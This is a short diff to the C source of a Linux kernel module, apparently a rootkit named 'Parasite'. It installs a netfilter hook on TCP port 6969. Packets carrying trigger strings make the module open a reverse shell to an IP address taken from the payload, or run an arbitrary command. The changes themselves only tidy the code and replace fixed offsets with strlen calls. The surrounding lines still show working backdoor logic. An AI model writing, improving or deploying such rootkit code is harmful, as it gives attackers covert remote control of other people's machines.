@@ -177,9 +177,10 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 	char* _data;             // For buffer use
 
 	// Checks if packet's empty
-	if (!skb)
+	if (!skb) { 
 		return NF_ACCEPT;
-
+	}
+	
 	iph = ip_hdr(skb);
 	if (iph->protocol == IPPROTO_TCP) {
 
@@ -187,7 +188,7 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 		
 		// LISTENING-PORT: Default is 6969 (nice), change if desired!
 		if (ntohs(tcph->dest) != 6969) {
-				return NF_ACCEPT;
+			return NF_ACCEPT;
 		}
 
 		// Grabs packet payload size
@@ -229,7 +230,7 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 			//u32 ipsrc = ntohl(iph->saddr); Doesnt work as expected, will fix later
 			
 			char* ipsrc = kmalloc(32, GFP_KERNEL);
-			strncpy(ipsrc, user_data + 15, 32);
+			strncpy(ipsrc, user_data + strlen(rootkit_rshell), 32);
 
 			//printk(KERN_INFO "IP ADDRESS IS: %s\n", ipsrc);
 
@@ -242,7 +243,7 @@ static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_
 		if(memcmp(user_data, rootkit_cmd, strlen(rootkit_cmd)) == 0) {
 
 			char* cmd = kmalloc(64, GFP_KERNEL);
-			strncpy(cmd, user_data + 12, 64);
+			strncpy(cmd, user_data + strlen(rootkit_cmd), 64);
 			//printk(KERN_DEBUG "Parasite cmd: %s", cmd);
 			start_command(cmd);
 			kfree(cmd);
